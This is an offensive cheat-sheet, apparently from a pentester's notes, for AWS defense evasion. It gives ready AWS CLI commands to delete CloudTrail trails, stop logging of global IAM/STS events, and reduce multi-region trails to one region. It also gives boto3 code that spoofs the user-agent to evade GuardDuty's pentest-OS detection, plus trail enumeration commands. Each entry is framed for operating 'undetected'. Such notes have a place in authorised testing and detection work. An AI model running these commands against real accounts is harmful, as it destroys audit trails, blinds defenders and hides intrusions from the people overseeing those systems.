# AWS CloudTrail Evasion & Log Manipulation

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Disable CloudTrail Entirely [added: 2026-04]
- **Tags:** #AWS #CloudTrail #DeleteTrail #LogEvasion #DefenseEvasion #AuditBypass #TrailDeletion
- **Trigger:** Need to operate undetected and have admin-level CloudTrail permissions
- **Prereq:** `cloudtrail:DeleteTrail` permission or administrative access
- **Yields:** Complete removal of audit logging for the targeted trail
- **Opsec:** High
- **Context:** Have `cloudtrail:DeleteTrail` or admin — nuclear option, highly detectable
- **Payload/Method:**
  ```bash
  aws cloudtrail delete-trail --name <trail_name> --profile administrator
  ```

### Blind Global Service Logging (Stealth Partial Disable) [added: 2026-04]
- **Tags:** #AWS #CloudTrail #GlobalServiceEvents #StealthEvasion #IAMBlinding #STSBlinding #PartialDisable
- **Trigger:** Need to hide IAM/STS activity without fully deleting the trail
- **Prereq:** `cloudtrail:UpdateTrail` permission on the target trail
- **Yields:** IAM, STS, and other global service API calls no longer logged
- **Opsec:** Med
- **Context:** More subtle than full deletion — disables logging of IAM, STS, etc. across regions
- **Payload/Method:**
  ```bash
  aws cloudtrail update-trail --name <trail_name> --no-include-global-service-events
  ```

### Limit CloudTrail to Single Region (Reduce Visibility) [added: 2026-04]
- **Tags:** #AWS #CloudTrail #MultiRegion #RegionBlinding #LogReduction #DefenseEvasion #TrailScoping
- **Trigger:** Target has multi-region trail and you want to operate in unmonitored regions
- **Prereq:** `cloudtrail:UpdateTrail` permission on the target trail
- **Yields:** Unmonitored regions where API calls are not logged
- **Opsec:** Med
- **Context:** Multi-region trail → single-region, attacker operates in unmonitored regions
- **Payload/Method:**
  ```bash
  aws cloudtrail update-trail --name <trail_name> \
    --no-include-global-service-events \
    --no-is-multi-region \
    --region eu-west-1
  ```

### GuardDuty User-Agent Evasion (Kali/Parrot/Pentoo Detection Bypass) [added: 2026-04]
- **Tags:** #AWS #GuardDuty #UserAgent #Pacu #Boto3 #PentestOSDetection #UASpoof #DefenseEvasion
- **Trigger:** Using Kali/Parrot/Pentoo and GuardDuty is enabled in the target account
- **Prereq:** AWS API access from a pentest OS (Kali, Parrot, Pentoo) + Pacu or Boto3 installed
- **Yields:** API calls no longer flagged by GuardDuty PenTestingKaliLinux finding type
- **Opsec:** Low
- **Context:** GuardDuty detects API calls from known pentest OS user-agents (Kali, Parrot, Pentoo)
- **Payload/Method:**
  ```python
  # Pacu automatically patches boto3 user-agent — use Pacu for all API calls
  # Manual override in boto3:
  import boto3
  session = boto3.session.Session()
  session._session.user_agent_name = "Boto3"
  session._session.user_agent_version = "1.26.0"
  session._session.user_agent_extra = ""
  ```
  ```bash
  # Or use Pacu which auto-detects and patches user-agent:
  python3 pacu.py
  # Pacu replaces "Kali"/"Parrot"/"Pentoo" with innocuous string
  ```

### CloudTrail Useful Enumeration [added: 2026-04]
- **Tags:** #AWS #CloudTrail #Enumeration #TrailStatus #LoggingRecon #AuditDiscovery #Reconnaissance
- **Trigger:** Beginning a cloud engagement and need to understand logging coverage before acting
- **Prereq:** `cloudtrail:ListTrails`, `cloudtrail:DescribeTrails`, `cloudtrail:GetTrailStatus` permissions
- **Yields:** Full picture of which trails are active, multi-region, and logging global services
- **Opsec:** Low
- **Context:** Understand logging coverage before acting
- **Payload/Method:**
  ```bash
  aws cloudtrail list-trails
  aws cloudtrail describe-trails
  aws cloudtrail get-trail-status --name <trail_name>
  # Check: IsLogging, IncludeGlobalServiceEvents, IsMultiRegionTrail
  ```
